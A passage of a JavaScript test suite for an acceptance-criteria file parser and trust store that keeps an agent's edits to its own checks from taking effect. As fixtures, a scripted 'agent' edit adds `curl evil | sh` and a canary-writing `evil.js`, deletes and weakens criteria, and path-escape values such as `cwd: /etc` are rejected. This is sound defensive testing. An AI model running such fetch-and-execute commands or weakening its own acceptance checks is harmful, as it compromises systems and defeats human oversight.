// The acceptance file of Proof-of-Done, version 1 (plan task pod-20, docs/PROOF-ACCEPTANCE.md): `.chatmcp/acceptance.yml`, its strict
// YAML subset reader (lib/proof/yaml-subset.mjs), the schema and the baseline-only rule (lib/proof/acceptance.mjs), the trust-by-hash
// store (lib/proof/trust-store.mjs) and proposeAcceptance.
//
// What it proves:
//   1. malformed files (more than 20 kinds) are rejected with the line number and the reason the reader names;
//   2. valid files read to the exact expected object (block scalars, quoted strings with `#`, CRLF, a leading BOM);
//   3. a scripted "agent" that adds `run: curl evil | sh` and deletes a criterion changes nothing the API returns: the criteria are the
//      BASELINE's, the edit is flagged `acceptance_edited` with the ids, and the edited file's sha256 is not trusted - a stand-in runner
//      that runs only what the public API calls runnable leaves a canary file absent (with a positive control that it does run);
//   4. the trust store: trust / isTrusted / revoke / list, a missing or corrupt store is "nothing trusted", concurrent writes keep valid JSON;
//   5. proposeAcceptance on Node, Python and .NET sample projects writes nothing and proposes a file the reader accepts.
import assert from 'node:assert/strict';
import { spawnSync } from 'node:child_process';
import { createHash } from 'node:crypto';
import fs from 'node:fs/promises';
import { existsSync } from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import {
  ACCEPTANCE_FILE, AcceptanceError, acceptanceSha256, compareAcceptance, parseAcceptance, proposeAcceptance, resolveAcceptance,
} from '../lib/proof/acceptance.mjs';
import { TRUST_FILE, createTrustStore } from '../lib/proof/trust-store.mjs';
import { parseYamlSubset, toPlainValue } from '../lib/proof/yaml-subset.mjs';

const sha = (bytes) => createHash('sha256').update(bytes).digest('hex');
const tmp = await fs.mkdtemp(path.join(os.tmpdir(), 'chatmcp-proof-acceptance-'));
let passed = 0;
const ok = (message) => { passed += 1; console.log(`PASS ${message}`); };

/** The first error parseAcceptance throws, as {line, reason}; fails when it accepts the text. */
function rejection(input) {
  try { parseAcceptance(input); } catch (error) {
    assert.ok(error instanceof AcceptanceError, `expected an AcceptanceError, got ${error?.stack || error}`);
    assert.equal(error.code, 'acceptance_invalid');
    assert.match(error.message, new RegExp(`line ${error.line}\\b`), 'the message names the line');
    return { line: error.line, reason: error.reason };
  }
  assert.fail(`accepted:\n${typeof input === 'string' ? input : input.toString('utf8')}`);
}

const GOOD = `version: 1
criteria:
  - id: unit
    text: The unit tests pass
    checks:
      - run: npm test
`;

try {
  // ---------------------------------------------------------------- 1. malformed fixtures, each with its line and reason
  const deep = (levels) => {
    let text = 'version: 1\ncriteria:\n  - id: a\n    text: t\n    manual:\n      note: n\nreproduce:\n';
    let indent = '  ';
    for (let i = 0; i < levels; i++) { text += `${indent}k${i}:\n`; indent += '  '; }
    return text + `${indent}leaf: x\n`;
  };
  const MALFORMED = [
    ['anchor', `${GOOD}reproduce: &setup\n  setup:\n    - npm ci\n`, 7, 'anchor'],
    ['alias', `${GOOD}protected:\n  - *glob\n`, 8, 'alias'],
    ['tag', 'version: !!int 1\ncriteria: []\n', 1, 'tag'],
    ['local tag on an item', `${GOOD}protected:\n  - !glob src/**\n`, 8, 'tag'],
    ['flow mapping', `${GOOD}reproduce: {setup: [npm ci]}\n`, 7, 'flow_collection'],
    ['flow sequence', `${GOOD}protected: [src/**]\n`, 7, 'flow_collection'],
    ['second document', `${GOOD}---\nversion: 1\n`, 7, 'multiple_documents'],
    ['document end marker', `${GOOD}...\n`, 7, 'multiple_documents'],
    ['directive', `%YAML 1.2\n---\n${GOOD}`, 1, 'directive'],
    ['duplicate top-level key', `${GOOD}version: 1\n`, 7, 'duplicate_key'],
    ['duplicate nested key', 'version: 1\ncriteria:\n  - id: a\n    text: t\n    id: b\n    manual:\n      note: n\n', 5, 'duplicate_key'],
    ['tab in indentation', 'version: 1\ncriteria:\n\t- id: a\n', 3, 'tab_indent'],
    ['tab after spaces in indentation', 'version: 1\ncriteria:\n  - id: a\n  \t text: t\n', 4, 'tab_indent'],
    ['missing version', 'criteria:\n  - id: a\n    text: t\n    manual:\n      note: n\n', 1, 'missing_version'],
    ['version 2', GOOD.replace('version: 1', 'version: 2'), 1, 'unsupported_version'],
    ['version as a string', GOOD.replace('version: 1', 'version: "1"'), 1, 'unsupported_version'],
    ['unknown top-level key', `${GOOD}owner: me\n`, 7, 'unknown_key'],
    ['unknown key in a check', `${GOOD}        shell: bash\n`, 7, 'unknown_key'],
    ['unknown key in expect', GOOD.replace('npm test\n', 'npm test\n        expect:\n          stdout: ok\n'), 8, 'unknown_key'],
    ['duplicate criterion id', `${GOOD}  - id: unit\n    text: again\n    manual:\n      note: n\n`, 7, 'duplicate_id'],
    ['empty criteria', 'version: 1\ncriteria:\n', 2, 'empty_criteria'],
    ['no criteria key', 'version: 1\nprotected:\n  - a\n', 1, 'missing_key'],
    ['cwd ../..', GOOD.replace('npm test\n', 'npm test\n        cwd: ../..\n'), 7, 'cwd_outside_workspace'],
    ['cwd that climbs out after a folder', GOOD.replace('npm test\n', 'npm test\n        cwd: src/../../x\n'), 7, 'cwd_outside_workspace'],
    ['absolute POSIX cwd', GOOD.replace('npm test\n', 'npm test\n        cwd: /etc\n'), 7, 'cwd_outside_workspace'],
    ['absolute Windows cwd', GOOD.replace('npm test\n', 'npm test\n        cwd: "C:\\\\Windows"\n'), 7, 'cwd_outside_workspace'],
    ['drive-relative cwd', GOOD.replace('npm test\n', 'npm test\n        cwd: "D:tools"\n'), 7, 'cwd_outside_workspace'],
    ['UNC cwd', GOOD.replace('npm test\n', 'npm test\n        cwd: "\\\\\\\\server\\\\share"\n'), 7, 'cwd_outside_workspace'],
    ['home cwd', GOOD.replace('npm test\n', 'npm test\n        cwd: ~/x\n'), 7, 'cwd_outside_workspace'],
    ['protected glob outside', `${GOOD}protected:\n  - ../secrets/**\n`, 8, 'path_outside_workspace'],
    ['over-long file', `${GOOD}# ${'x'.repeat(70 * 1024)}\n`, 7, 'too_large'],
    ['deep nesting', deep(20), 8 + 15, 'too_deep'],
    ['deep nesting on one line', `${GOOD}protected:\n  ${'- '.repeat(20)}x\n`, 8, 'too_deep'],
    ['BOM inside the file', `version: 1\n\uFEFFcriteria:\n`, 2, 'bom_misplaced'],
    ['UTF-16 file', Buffer.concat([Buffer.from([0xff, 0xfe]), Buffer.from(GOOD, 'utf16le')]), 1, 'not_utf8'],
    ['invalid UTF-8 on line 3', Buffer.concat([Buffer.from('version: 1\ncriteria:\n  - id: '), Buffer.from([0xc3, 0x28]), Buffer.from('\n')]), 3, 'not_utf8'],
    ['NUL byte', `${GOOD}protected:\n  - a\u0000b\n`, 8, 'control_character'],
    ['bare CR line break', 'version: 1\rcriteria:\n', 1, 'bare_cr'],
    ['unclosed double quote', GOOD.replace('npm test', '"npm test'), 6, 'unclosed_quote'],
    ['unclosed single quote', GOOD.replace('npm test', "'npm test"), 6, 'unclosed_quote'],
    ['unknown escape', GOOD.replace('npm test', '"npm \\q test"'), 6, 'bad_escape'],
    ['text after a closing quote', GOOD.replace('npm test', '"npm" test'), 6, 'trailing_content'],
    ['mapping on one line', GOOD.replace('npm test', 'npm: test'), 6, 'syntax'],
    ['complex key', `${GOOD}? a\n: b\n`, 7, 'complex_key'],
    ['quoted key', `${GOOD}"protected":\n  - a\n`, 7, 'unsupported_key'],
    ['bad indentation', 'version: 1\ncriteria:\n  - id: a\n     text: t\n', 4, 'bad_indent'],
    ['plain scalar over two lines', 'version: 1\ncriteria:\n  - id: a\n    text: one\n      two\n', 5, 'bad_indent'],
    ['bad block scalar header', GOOD.replace('npm test', '|x'), 6, 'block_scalar_header'],
    ['reserved indicator', GOOD.replace('npm test', '@npm test'), 6, 'reserved_indicator'],
    ['criterion with checks and manual', GOOD.replace('    checks:', '    manual:\n      note: n\n    checks:'), 3, 'check_and_manual'],
    ['criterion with neither', 'version: 1\ncriteria:\n  - id: a\n    text: t\n', 3, 'no_check_or_manual'],
    ['empty checks list', 'version: 1\ncriteria:\n  - id: a\n    text: t\n    checks:\n', 5, 'empty_checks'],
    ['manual without inspect or note', 'version: 1\ncriteria:\n  - id: a\n    text: t\n    manual:\n', 5, 'empty_manual'],
    ['bad id', GOOD.replace('id: unit', 'id: Unit Tests'), 3, 'bad_id'],
    ['missing text', GOOD.replace('    text: The unit tests pass\n', ''), 3, 'missing_key'],
    ['timeout zero', GOOD.replace('npm test\n', 'npm test\n        timeout: 0\n'), 7, 'bad_value'],
    ['timeout not a number', GOOD.replace('npm test\n', 'npm test\n        timeout: ten\n'), 7, 'bad_type'],
    ['repeat too large', GOOD.replace('npm test\n', 'npm test\n        repeat: 1000\n'), 7, 'bad_value'],
    ['exit code 256', GOOD.replace('npm test\n', 'npm test\n        expect:\n          exit: 256\n'), 8, 'bad_value'],
    ['empty run', GOOD.replace('npm test', '""'), 6, 'bad_value'],
    ['top level is a list', '- version: 1\n', 1, 'not_a_mapping'],
    ['empty file', '# nothing here\n\n', 1, 'empty_file'],
    ['criteria is a mapping', 'version: 1\ncriteria:\n  id: a\n', 3, 'bad_type'],
    ['inline sequence in an item', `${GOOD}protected:\n  - - a\n`, 8, 'bad_type'],
    ['list item after a key', GOOD.replace('npm test', '- npm test'), 6, 'unexpected_sequence'],
    ['key with a space', `${GOOD}my key: x\n`, 7, 'unsupported_key'],
    ['first key with a space', 'my key: 1\n', 1, 'unsupported_key'],
    ['sequence item inside a mapping', 'version: 1\ncriteria:\n  - id: a\n    text: t\n    - x\n', 5, 'unexpected_sequence'],
    ['too many criteria', `version: 1\ncriteria:\n${'  - id: a\n    text: t\n    manual:\n      note: n\n'.replace('id: a', 'id: c0')}${Array.from({ length: 100 }, (_, i) => `  - id: c${i + 1}\n    text: t\n    manual:\n      note: n\n`).join('')}`, 3 + 4 * 100, 'too_many'],
  ];
  assert.ok(MALFORMED.length >= 20);
  for (const [name, input, line, reason] of MALFORMED) {
    const got = rejection(input);
    assert.deepEqual(got, { line, reason }, `${name}: expected line ${line} ${reason}, got line ${got.line} ${got.reason}`);
  }
  ok(`${MALFORMED.length} malformed files are rejected, each with the expected line number and reason`);

  // The error is an AcceptanceError whose message names the file, the line and the reason in words (not only the code).
  try { parseAcceptance(`${GOOD}protected:\n  - *glob\n`); } catch (error) {
    assert.match(error.message, /^\.chatmcp\/acceptance\.yml line 8: /);
    assert.match(error.message, /alias/i);
  }
  ok('the message names .chatmcp/acceptance.yml and the line');

  // ---------------------------------------------------------------- 2. valid files read to the expected object
  const FULL = [
    '# The acceptance file of the sample project',
    'version: 1',
    '',
    'criteria:',
    '  - id: unit-tests   # a comment after a value',
    '    text: "All unit tests pass # not a comment inside quotes"',
    '    checks:',
    '      - run: npm test',
    '      - run: \'node scripts/check.mjs --tag "#7"\'',
    '        cwd: ./tools/',
    '        timeout: 120',
    '        expect:',
    '          exit: 3',
    '        repeat: 2',
    '  - id: ui.header',
    '    text: >',
    '      The header shows the',
    '      product name.',
    '',
    '      And the gold mark.',
    '    manual:',
    '      inspect:',
    '        - ui/src/App.tsx',
    '        - "docs/screens/header #1.png"',
    '      note: |',
    '        Open the app.',
    '          Look at the top left.',
    '',
    'protected:',
    '- tests/**',
    '- .chatmcp/**',
    'reproduce:',
    '  setup:',
    '    - npm ci',
    '    - "echo \\"done\\"\\t\\u00e9"',
    '',
  ].join('\n');
  const EXPECTED = {
    version: 1,
    criteria: [
      {
        id: 'unit-tests',
        text: 'All unit tests pass # not a comment inside quotes',
        checks: [
          { run: 'npm test', cwd: '.', timeout: 600, expect: { exit: 0 }, repeat: 1 },
          { run: 'node scripts/check.mjs --tag "#7"', cwd: 'tools', timeout: 120, expect: { exit: 3 }, repeat: 2 },
        ],
      },
      {
        id: 'ui.header',
        text: 'The header shows the product name.\nAnd the gold mark.\n',
        manual: { inspect: ['ui/src/App.tsx', 'docs/screens/header #1.png'], note: 'Open the app.\n  Look at the top left.\n' },
      },
    ],
    protected: ['tests/**', '.chatmcp/**'],
    reproduce: { setup: ['npm ci', 'echo "done"\t\u00e9'] },
  };
  assert.deepEqual(parseAcceptance(FULL), EXPECTED);
  assert.deepEqual(parseAcceptance(Buffer.from(FULL, 'utf8')), EXPECTED, 'bytes read like text');
  assert.deepEqual(parseAcceptance(FULL.replace(/\n/g, '\r\n')), EXPECTED, 'CRLF line endings are accepted');
  assert.deepEqual(parseAcceptance(`\uFEFF${FULL}`), EXPECTED, 'a leading BOM is accepted');
  assert.deepEqual(parseAcceptance(Buffer.concat([Buffer.from([0xef, 0xbb, 0xbf]), Buffer.from(FULL)])), EXPECTED, 'a leading BOM in bytes');
  assert.deepEqual(parseAcceptance(`---\n${FULL}`), EXPECTED, 'one document start marker is accepted');
  assert.deepEqual(parseAcceptance(GOOD), { version: 1, criteria: [{ id: 'unit', text: 'The unit tests pass', checks: [{ run: 'npm test', cwd: '.', timeout: 600, expect: { exit: 0 }, repeat: 1 }] }], protected: [], reproduce: { setup: [] } });
  ok('a full file (block scalars, quoted strings with #, comments, defaults) reads to the expected object, also as bytes, CRLF and with a BOM');

  // Error lines count physical lines also with CRLF and a BOM.
  assert.deepEqual(rejection(`\uFEFF${GOOD}owner: me\n`.replace(/\n/g, '\r\n')), { line: 7, reason: 'unknown_key' });
  ok('line numbers stay right with CRLF and a BOM');

  // The YAML subset itself: block scalar chomping and indentation indicators, folding, scalars and their types.
  const plain = (text) => JSON.parse(JSON.stringify(toPlainValue(parseYamlSubset(text)))); // compared as ordinary objects
  assert.deepEqual(plain('a: |\n  x\n  y\n\n\nb: 1\n'), { a: 'x\ny\n', b: 1 });
  assert.deepEqual(plain('a: |-\n  x\n  y\n\nb: 1\n'), { a: 'x\ny', b: 1 });
  assert.deepEqual(plain('a: |+\n  x\n\n\nb: 1\n'), { a: 'x\n\n\n', b: 1 });
  assert.deepEqual(plain('a: |2\n    x\n  y\n'), { a: '  x\ny\n' });
  assert.deepEqual(plain('a: >-\n  one\n  two\n\n  three\n    more\n  four\n'), { a: 'one two\nthree\n  more\nfour' });
  assert.deepEqual(plain('a: >\n\n  x\n'), { a: '\nx\n' });
  assert.deepEqual(plain('a: |\nb: 2\n'), { a: '', b: 2 });
  assert.deepEqual(plain('a: "x # y" # z\nb: \'it\'\'s\'\nc: x#y\nd: -1\ne: 007\nf: true\ng: ~\nh:\ni: 1.5\n'),
    { a: 'x # y', b: "it's", c: 'x#y', d: -1, e: '007', f: true, g: null, h: null, i: '1.5' });
  assert.deepEqual(plain('a:\n- x\n- y: 1\n  z: 2\nb:\n  -\n    c: 3\n'), { a: ['x', { y: 1, z: 2 }], b: [{ c: 3 }] });
  assert.deepEqual(plain('a: "\\\\ \\" \\/ \\n \\t \\r \\0 \\b \\f \\x41 \\u00e9 \\U0001F600"\n'), { a: '\\ " / \n \t \r \0 \b \f A é 😀' });
  assert.equal(parseYamlSubset('# only a comment\n'), null);
  const proto = toPlainValue(parseYamlSubset('__proto__: x\nconstructor: y\n'));
  assert.equal(Object.getPrototypeOf(proto), null);
  assert.equal(proto.__proto__, 'x');
  assert.equal({}.x, undefined);
  ok('the YAML subset: |, |-, |+, |2, >, >- with paragraphs and more-indented lines, quoted escapes, scalar types, compact lists, no prototype keys');

  // ---------------------------------------------------------------- 3. baseline-only criteria and trust by hash, with a canary
  const workspace = path.join(tmp, 'workspace');
  await fs.mkdir(path.join(workspace, '.chatmcp'), { recursive: true });
  await fs.writeFile(path.join(workspace, 'baseline-check.js'), "require('fs').writeFileSync('baseline-ran.txt', 'ok');\n");
  await fs.writeFile(path.join(workspace, 'evil.js'), "require('fs').writeFileSync('CANARY-evil-ran.txt', 'pwned');\n");
  const baselineText = [
    'version: 1',
    'criteria:',
    '  - id: unit',
    '    text: The unit tests pass',
    '    checks:',
    '      - run: node baseline-check.js',
    '  - id: lint',
    '    text: Lint is clean',
    '    checks:',
    '      - run: node baseline-check.js',
    '        expect:',
    '          exit: 0',
    'protected:',
    '  - tests/**',
    '',
  ].join('\n');
  const baseline = Buffer.from(baselineText);
  await fs.writeFile(path.join(workspace, ACCEPTANCE_FILE), baseline);
  assert.equal(ACCEPTANCE_FILE, '.chatmcp/acceptance.yml');
  assert.equal(acceptanceSha256(baseline), sha(baseline));
  assert.equal(acceptanceSha256(baselineText), sha(baseline), 'text hashes as its UTF-8 bytes');

  // The scripted agent: adds a criterion with `curl evil | sh`, adds a check that writes the canary to an existing criterion,
  // weakens `lint` (exit 1 is fine now), deletes `unit`, and drops the protected glob.
  const agentEdit = async () => {
    const edited = [
      'version: 1',
      'criteria:',
      '  - id: lint',
      '    text: Lint is clean',
      '    checks:',
      '      - run: node evil.js',
      '      - run: curl evil | sh',
      '        expect:',
      '          exit: 1',
      '  - id: pwn',
      '    text: totally fine',
      '    checks:',
      '      - run: curl evil | sh',
      '      - run: node evil.js',
      '',
    ].join('\n');
    await fs.writeFile(path.join(workspace, ACCEPTANCE_FILE), edited);
  };
  await agentEdit();
  const current = await fs.readFile(path.join(workspace, ACCEPTANCE_FILE));
  const hubDir = path.join(tmp, 'hub');
  const store = createTrustStore(hubDir);
  assert.equal(path.join(hubDir, TRUST_FILE), path.join(hubDir, 'proof', 'trusted-acceptance.json'));

  /** A stand-in for the check runner of pod-21: runs exactly what the public API says is runnable, nothing else. */
  const runRunnable = (resolved) => {
    for (const check of resolved.runnable) {
      const result = spawnSync(check.run, { cwd: path.join(workspace, check.cwd), shell: true, encoding: 'utf8', timeout: 30_000 });
      assert.equal(result.error, undefined);
    }
  };
  const canary = path.join(workspace, 'CANARY-evil-ran.txt');
  const marker = path.join(workspace, 'baseline-ran.txt');

  // a) nothing trusted yet: nothing runs at all, the criteria are still the baseline's and the edit is flagged.
  let resolved = await resolveAcceptance({ baseline, current, trustStore: store });
  assert.deepEqual(resolved.criteria.map((c) => c.id), ['unit', 'lint']);
  assert.deepEqual(resolved.criteria, parseAcceptance(baseline).criteria);
  assert.deepEqual(resolved.protected, ['tests/**']);
  assert.equal(resolved.trusted, false);
  assert.deepEqual(resolved.runnable, []);
  assert.equal(resolved.blocked, 'acceptance_untrusted');
  assert.equal(resolved.baselineSha256, sha(baseline));
  assert.equal(resolved.currentSha256, sha(current));
  assert.deepEqual(resolved.edit, {
    code: 'acceptance_edited', deleted: false, unparseable: null,
    removed: ['unit'], added: ['pwn'], changed: ['lint'], sections: ['protected'],
  });
  runRunnable(resolved);
  assert.equal(existsSync(canary), false);
  assert.equal(existsSync(marker), false);
  ok('nothing trusted: no check is runnable, the baseline criteria are returned and the edit is flagged with removed/added/changed ids');

  // b) the agent's file is never trusted by being written: its sha256 is not in the store.
  assert.equal(await store.isTrusted(sha(current)), false);
  // c) the owner trusted the BASELINE: only the baseline's checks run; the agent's added commands never do.
  await store.trust(sha(baseline), { approvedBy: 'owner', at: '2026-11-20T10:00:00.000Z' });
  resolved = await resolveAcceptance({ baseline, current, trustStore: store });
  assert.equal(resolved.trusted, true);
  assert.equal(resolved.blocked, null);
  assert.deepEqual(resolved.runnable.map((c) => [c.criterionId, c.index, c.run]), [['unit', 0, 'node baseline-check.js'], ['lint', 0, 'node baseline-check.js']]);
  assert.ok(!JSON.stringify(resolved).includes('curl evil'), 'no command of the edited file reaches the result');
  assert.ok(!JSON.stringify(resolved.runnable).includes('evil.js'));
  assert.equal(resolved.edit.code, 'acceptance_edited');
  runRunnable(resolved);
  assert.equal(existsSync(marker), true, 'positive control: the stand-in runner does run what is runnable');
  assert.equal(existsSync(canary), false, 'the canary written by the agent-added check stays absent');
  ok('baseline trusted: only the baseline checks are runnable, the agent-added `curl evil | sh` and canary check never are; canary absent, control marker present');

  // d) the agent's file trusted by mistake does not matter: the checks still come from the baseline.
  await store.trust(sha(current), { approvedBy: 'owner', at: '2026-11-20T10:01:00.000Z' });
  resolved = await resolveAcceptance({ baseline, current, trustStore: store });
  assert.ok(!JSON.stringify(resolved.runnable).includes('evil'));
  await store.revoke(sha(current));
  // e) the baseline revoked: nothing runs again.
  await store.revoke(sha(baseline));
  resolved = await resolveAcceptance({ baseline, current, trustStore: store });
  assert.deepEqual(resolved.runnable, []);
  assert.equal(resolved.blocked, 'acceptance_untrusted');
  ok('trusting the edited file changes nothing that runs; revoking the baseline makes nothing runnable');

  // f) the agent deletes the file, or writes a broken one, or the file is untouched.
  await store.trust(sha(baseline), { approvedBy: 'owner', at: '2026-11-20T10:02:00.000Z' });
  resolved = await resolveAcceptance({ baseline, current: null, trustStore: store });
  assert.deepEqual(resolved.criteria.map((c) => c.id), ['unit', 'lint']);
  assert.deepEqual(resolved.edit, { code: 'acceptance_edited', deleted: true, unparseable: null, removed: ['unit', 'lint'], added: [], changed: [], sections: ['protected'] });
  assert.equal(resolved.currentSha256, null);
  resolved = await resolveAcceptance({ baseline, current: 'version: 1\ncriteria: *all\n', trustStore: store });
  assert.deepEqual(resolved.edit.unparseable, { line: 2, reason: 'alias' });
  assert.deepEqual(resolved.edit.removed, ['unit', 'lint']);
  assert.equal(resolved.runnable.length, 2);
  resolved = await resolveAcceptance({ baseline, current: Buffer.from(baseline), trustStore: store });
  assert.equal(resolved.edit, null);
  // A comment-only edit changes the bytes, so it is flagged, but no id changed.
  resolved = await resolveAcceptance({ baseline, current: `${baselineText}# a comment\n`, trustStore: store });
  assert.deepEqual(resolved.edit, { code: 'acceptance_edited', deleted: false, unparseable: null, removed: [], added: [], changed: [], sections: [] });
  // No baseline (the file did not exist at task start): no criteria, and a file the agent created is an edit, not a source.
  resolved = await resolveAcceptance({ baseline: null, current, trustStore: store });
  assert.deepEqual(resolved.criteria, []);
  assert.deepEqual(resolved.runnable, []);
  assert.equal(resolved.blocked, 'no_baseline');
  assert.deepEqual(resolved.edit.added, ['lint', 'pwn']);
  assert.equal(compareAcceptance(null, null), null);
  // A broken baseline is the owner's to fix: it throws, it is never read as "no criteria".
  await assert.rejects(resolveAcceptance({ baseline: 'version: 2\n', current: null, trustStore: store }), (error) => error.code === 'acceptance_invalid' && error.line === 1);
  await assert.rejects(resolveAcceptance({ baseline, current, trustStore: null }), TypeError);
  // Only the answer `true` trusts: a store that answers with anything else (a string, an object) trusts nothing.
  for (const answer of ['yes', 1, {}, [sha(baseline)]]) {
    resolved = await resolveAcceptance({ baseline, current, trustStore: { isTrusted: async () => answer } });
    assert.deepEqual([resolved.trusted, resolved.runnable], [false, []], JSON.stringify(answer));
  }
  ok('a deleted, unparseable, untouched or comment-only edit is reported exactly; no baseline means no criteria; a broken baseline throws');

  // Weakening is a change: each kind of edit to a single check is reported for its criterion.
  for (const [what, edit] of [
    ['run', (t) => t.replace('      - run: node baseline-check.js\n  - id: lint', '      - run: "true"\n  - id: lint')],
    ['exit', (t) => t.replace('exit: 0', 'exit: 1')],
    ['text', (t) => t.replace('Lint is clean', 'Lint is mostly clean')],
    ['timeout', (t) => t.replace('          exit: 0\n', '          exit: 0\n        timeout: 5\n')],
    ['repeat', (t) => t.replace('          exit: 0\n', '          exit: 0\n        repeat: 3\n')],
    ['cwd', (t) => t.replace('          exit: 0\n', '          exit: 0\n        cwd: src\n')],
    ['checks to manual', (t) => t.replace('    checks:\n      - run: node baseline-check.js\n        expect:\n          exit: 0\n', '    manual:\n      note: trust me\n')],
  ]) {
    const edited = edit(baselineText);
    assert.notEqual(edited, baselineText, what);
    const diff = compareAcceptance(baseline, edited);
    const expectedChanged = what === 'run' ? ['unit'] : ['lint'];
    assert.deepEqual(diff.changed, expectedChanged, `${what}: ${JSON.stringify(diff)}`);
  }
  const reordered = compareAcceptance(baseline, baselineText.replace(/  - id: unit[\s\S]*?(?=  - id: lint)/, '').replace('protected:', '  - id: unit\n    text: The unit tests pass\n    checks:\n      - run: node baseline-check.js\nprotected:'));
  assert.deepEqual(reordered.sections, ['criteria_order']);
  assert.deepEqual(compareAcceptance(baseline, baselineText.replace('version: 1\n', 'version: 1\nreproduce:\n  setup:\n    - npm ci\n')).sections, ['reproduce']);
  ok('every weakening of a check (run, exit, text, timeout, repeat, cwd, checks to manual) and a reorder or a new reproduce step is reported');

  // ---------------------------------------------------------------- 4. the trust store
  const A = 'a'.repeat(64), B = 'b'.repeat(64);
  const storeDir = path.join(tmp, 'store-hub');
  const trust = createTrustStore(storeDir);
  const trustFile = path.join(storeDir, 'proof', 'trusted-acceptance.json');
  assert.equal(await trust.isTrusted(A), false, 'missing store: nothing trusted');
  assert.deepEqual(await trust.list(), []);
  await trust.trust(A, { approvedBy: 'owner', at: new Date('2026-11-20T00:00:00Z') });
  assert.equal(await trust.isTrusted(A), true);
  assert.equal(await trust.isTrusted(A.toUpperCase()), true, 'a hex digest is case-insensitive');
  assert.equal(await trust.isTrusted(B), false);
  assert.deepEqual(await trust.list(), [{ sha256: A, approvedBy: 'owner', at: '2026-11-20T00:00:00.000Z' }]);
  const written = JSON.parse(await fs.readFile(trustFile, 'utf8'));
  assert.deepEqual(written, { version: 1, trusted: { [A]: { approvedBy: 'owner', at: '2026-11-20T00:00:00.000Z' } } });
  assert.equal(await trust.revoke(A), true);
  assert.equal(await trust.revoke(A), false, 'revoking twice reports that nothing was trusted');
  assert.equal(await trust.isTrusted(A), false);
  for (const bad of ['', 'abc', 'g'.repeat(64), `${A}0`, null, 42, `${A.slice(1)}\n`]) {
    await assert.rejects(trust.trust(bad, { approvedBy: 'owner', at: '2026-11-20T00:00:00Z' }), TypeError, String(bad));
    assert.equal(await trust.isTrusted(bad), false);
  }
  await assert.rejects(trust.trust(A, {}), TypeError, 'approvedBy is required');
  await assert.rejects(trust.trust(A, { approvedBy: '  ' }), TypeError);
  await assert.rejects(trust.trust(A, { approvedBy: 'owner', at: 'yesterday' }), TypeError);
  await assert.rejects(trust.trust(A, { approvedBy: 'x'.repeat(201) }), TypeError);
  await trust.trust(A, { approvedBy: 'owner' });
  assert.ok(!Number.isNaN(Date.parse((await trust.list())[0].at)), 'at defaults to now');
  assert.throws(() => createTrustStore('relative/dir'), TypeError);
  ok('trust store: trust, isTrusted (case-insensitive), revoke, list, argument checks, the exact file it writes');

  // A corrupt store is "nothing trusted", whatever it says; never "all trusted".
  const CORRUPT = [
    '{not json',
    '[]',
    'null',
    `{"version":1,"trusted":"all"}`,
    `{"version":1,"trusted":true}`,
    `{"version":1,"trusted":{"*":{"approvedBy":"owner","at":"2026-11-20T00:00:00.000Z"}}}`,
    `{"version":1,"trusted":{"${A}":true}}`,
    `{"version":1,"trusted":{"${A}":{"approvedBy":"owner"}}}`,
    `{"version":1,"trusted":{"${A}":{"approvedBy":"owner","at":"not a time"}}}`,
    `{"version":1,"trusted":{"${A}":{"approvedBy":"owner","at":5}}}`,
    `{"version":1,"trusted":{"${A}":{"approvedBy":"","at":"2026-11-20T00:00:00.000Z"}}}`,
    `{"version":1,"trusted":{"${A}":{"approvedBy":7,"at":"2026-11-20T00:00:00.000Z"}}}`,
    `{"version":2,"trusted":{"${A}":{"approvedBy":"owner","at":"2026-11-20T00:00:00.000Z"}}}`,
    `{"trusted":{"${A}":{"approvedBy":"owner","at":"2026-11-20T00:00:00.000Z"}}}`,
    `{"version":1,"trusted":{"${A}":{"approvedBy":"owner","at":"2026-11-20T00:00:00.000Z"}},"all":true}`,
    `{"version":1,"trusted":{"${A}":{"approvedBy":"owner","at":"2026-11-20T00:00:00.000Z","extra":1}}}`,
    `{"version":1,"trusted":{"${A}":{"approvedBy":"owner","at":"2026-11-20T00:00:00.000Z"}}}${' '.repeat(1024 * 1024)}`,
    '',
  ];
  for (const text of CORRUPT) {
    await fs.writeFile(trustFile, text);
    assert.equal(await trust.isTrusted(A), false, `corrupt store read as trusted: ${text.slice(0, 80)}`);
    assert.equal(await trust.isTrusted('*'), false);
    assert.deepEqual(await trust.list(), []);
  }
  await fs.writeFile(trustFile, `\uFEFF{"version":1,"trusted":{"${A}":{"approvedBy":"owner","at":"2026-11-20T00:00:00.000Z"}}}`);
  assert.equal(await trust.isTrusted(A), true, 'a BOM written by an editor is not corruption');
  await fs.rm(trustFile);
  await fs.mkdir(trustFile);
  assert.equal(await trust.isTrusted(A), false, 'a folder in its place is nothing trusted');
  await fs.rm(trustFile, { recursive: true });
  // Trusting over a corrupt store keeps the corrupt file aside and writes a valid one with only the new entry.
  await fs.writeFile(trustFile, '{"version":1,"trusted":{"*":"yes"}}');
  await trust.trust(B, { approvedBy: 'owner', at: '2026-11-20T00:00:00Z' });
  assert.deepEqual((await trust.list()).map((e) => e.sha256), [B]);
  const kept = (await fs.readdir(path.dirname(trustFile))).filter((name) => name.startsWith('trusted-acceptance.corrupt-'));
  assert.equal(kept.length, 1);
  assert.equal(await fs.readFile(path.join(path.dirname(trustFile), kept[0]), 'utf8'), '{"version":1,"trusted":{"*":"yes"}}');
  ok(`${CORRUPT.length} corrupt stores read as nothing trusted (never all); a BOM is fine; trusting over a corrupt store keeps it aside`);

  // Concurrent writes: in one store and across two store objects on the same folder, every write lands and the file stays valid JSON.
  const concurrentDir = path.join(tmp, 'concurrent-hub');
  const one = createTrustStore(concurrentDir), two = createTrustStore(concurrentDir);
  const digests = Array.from({ length: 40 }, (_, i) => sha(`file ${i}`));
  await Promise.all(digests.map((digest, i) => (i % 2 ? one : two).trust(digest, { approvedBy: 'owner', at: '2026-11-20T00:00:00Z' })));
  await Promise.all(digests.filter((_, i) => i % 4 === 0).map((digest, i) => (i % 2 ? two : one).revoke(digest)));
  const final = JSON.parse(await fs.readFile(path.join(concurrentDir, 'proof', 'trusted-acceptance.json'), 'utf8'));
  assert.deepEqual(Object.keys(final.trusted).sort(), digests.filter((_, i) => i % 4 !== 0).sort());
  assert.deepEqual((await fs.readdir(path.join(concurrentDir, 'proof'))).filter((name) => name.endsWith('.tmp')), [], 'no temporary file left');
  ok('40 concurrent trusts and 10 concurrent revokes over two store objects: every write lands, valid JSON, no temporary file left');

  // ---------------------------------------------------------------- 5. proposeAcceptance
  const listTree = async (root) => (await fs.readdir(root, { recursive: true })).sort();
  const project = async (name, files) => {
    const root = path.join(tmp, 'projects', name);
